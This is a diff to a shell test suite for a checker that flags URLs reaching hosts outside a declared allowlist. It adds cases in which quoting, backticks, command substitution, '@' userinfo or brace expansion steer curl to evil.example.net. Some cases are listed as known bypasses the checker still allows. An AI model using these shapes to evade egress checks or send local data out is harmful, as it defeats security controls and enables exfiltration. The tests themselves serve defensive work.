@@ -854,19 +854,19 @@ check_msg "a backtick then a command after userinfo" "$sample_dir/sc4.sh" \
 # here the shape is a syntax error rather than a correct line.
 check_msg "a closing quote then a command substitution" "$sample_dir/sc5.sh" \
   'curl "https://erpc.global"$(cat f)/p' \
-  'a quote ends the host and an interpolation follows it'
+  'a quote ends the host and the shell would join what follows it'
 
 check_msg "a closing quote then a parameter expansion" "$sample_dir/sc6.sh" \
   'curl "https://erpc.global"${X}/p' \
-  'a quote ends the host and an interpolation follows it'
+  'a quote ends the host and the shell would join what follows it'
 
 check_msg "a closing single quote then a variable" "$sample_dir/sc7.sh" \
   "curl 'https://erpc.global'\$X/p" \
-  'a quote ends the host and an interpolation follows it'
+  'a quote ends the host and the shell would join what follows it'
 
 check_msg "a closing quote then a backtick" "$sample_dir/sc8.sh" \
   'curl "https://erpc.global"`cat f`"/p"' \
-  'a quote ends the host and an interpolation follows it'
+  'a quote ends the host and the shell would join what follows it'
 
 # ...and the correct lines that share the shape. The quote rule must not touch
 # a method call on a string literal, and the backtick rule must not touch a
@@ -914,6 +914,95 @@ check "KNOWN LIMIT: a quote inside the host" allow "$sample_dir/sk4.sh" \
 # is a real line break in the fixture.
 check "KNOWN LIMIT: a URL split across two lines" allow "$sample_dir/sk5.rs" \
   'let u = "https://api.github.com\n.evil.example.net/x";'
+
+# CLOSED: a quote right after the scheme. awk stops the authority at the
+# quote and hands over an EMPTY one, which used to return success before the
+# terminator was looked at. The shell joins the quoted part on, so these are
+# plain destinations needing no declared host at all:
+#
+#   $ bash -c 'echo https://"evil.example.net"/x'
+#   https://evil.example.net/x
+check_msg "a quoted host right after the scheme" "$sample_dir/sq1.sh" \
+  'curl https://"evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a single-quoted host right after the scheme" "$sample_dir/sq2.sh" \
+  "curl https://'evil.example.net'/x" \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted host after userinfo naming a declared host" "$sample_dir/sq3.sh" \
+  'curl https://erpc.global@"evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "an interpolation in quotes right after the scheme" "$sample_dir/sq4.sh" \
+  'curl "https://"$(cat f).evil.example.net/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+check_msg "a quoted host in a workflow step" "$sample_dir/sq5.yml" \
+  '      - run: curl https://"evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+# The same, reached by the second empty return: the trailing-punctuation
+# strip removes the `}` and leaves nothing. node accepts the host
+# `}evil.example.net`.
+check_msg "a quoted host after stripped punctuation" "$sample_dir/sq6.sh" \
+  'curl https://}"evil.example.net"/x' \
+  'a quote follows the scheme, so the host is outside the literal'
+
+# CLOSED: a quote ending a declared host, followed by a character the shell
+# joins on and that no other language here accepts in that position. `@`
+# REPLACES the host -- node resolves https://erpc.global@evil.example.net/x
+# to evil.example.net -- `{` is brace expansion, and the rest extend it.
+check_msg "a closing quote then an at sign" "$sample_dir/sq7.sh" \
+  'curl "https://erpc.global"@evil.example.net/x' \
+  'a quote ends the host and the shell would join what follows it'
+
+check_msg "a closing quote then the same quote again" "$sample_dir/sq8.sh" \
+  'curl "https://erpc.global"".evil.example.net/x' \
+  'a quote ends the host and the shell would join what follows it'
+
+check_msg "a closing quote then a brace expansion" "$sample_dir/sq9.sh" \
+  'curl "https://erpc.global"{.evil.example.net,}/x' \
+  'a quote ends the host and the shell would join what follows it'
+
+check_msg "a closing quote then a digit" "$sample_dir/sq10.sh" \
+  'curl "https://erpc.global"8.evil.example.net/x' \
+  'a quote ends the host and the shell would join what follows it'
+
+check_msg "a closing quote then an underscore" "$sample_dir/sq11.sh" \
+  'curl "https://erpc.global"_x.evil.example.net/x' \
+  'a quote ends the host and the shell would join what follows it'
+
+# ...and the correct lines the two closes must not touch. Building a URL
+# from a runtime host with nothing literal in it is the wholly-templated
+# case the header states; a nested quote is how a jq filter or a grep
+# pattern quotes a JSON string inside a shell argument.
+check "a scheme constant with a method call" allow "$sample_dir/sq12.rs" \
+  'let n = "https://".len();'
+
+check "a scheme concatenated with a runtime host" allow "$sample_dir/sq13.ts" \
+  "let u = 'https://' + host;"
+
+check "a JSON string quoted inside a shell argument" allow "$sample_dir/sq14.sh" \
+  "jq '.url == \"https://erpc.global\"' f.json"
+
+# KNOWN LIMITS that are the complement of the closed set. The header states
+# the open part as everything NOT in that set, so the list cannot leave a
+# shape out; these pin representative members of it, one per kind.
+check "KNOWN LIMIT: a backtick after a declared host, then a slash" allow "$sample_dir/sk6.sh" \
+  'curl https://erpc.global`/bin/echo .evil.example.net`/p'
+
+check "KNOWN LIMIT: a backtick as the last character of the authority" allow "$sample_dir/sk7.sh" \
+  'curl https://erpc.global`'
+
+check "KNOWN LIMIT: a closing quote then a comma" allow "$sample_dir/sk8.sh" \
+  'curl "https://erpc.global",evil.example.net/x'
+
+check "KNOWN LIMIT: a closing quote then the other quote" allow "$sample_dir/sk9.sh" \
+  "curl \"https://erpc.global\"'.evil.example.net/x'"
+
+check "KNOWN LIMIT: a closing quote then a hyphen" allow "$sample_dir/sk10.sh" \
+  'curl "https://erpc.global"-evil.example.net/x'
 
 # --- the invariant ------------------------------------------------------
 #
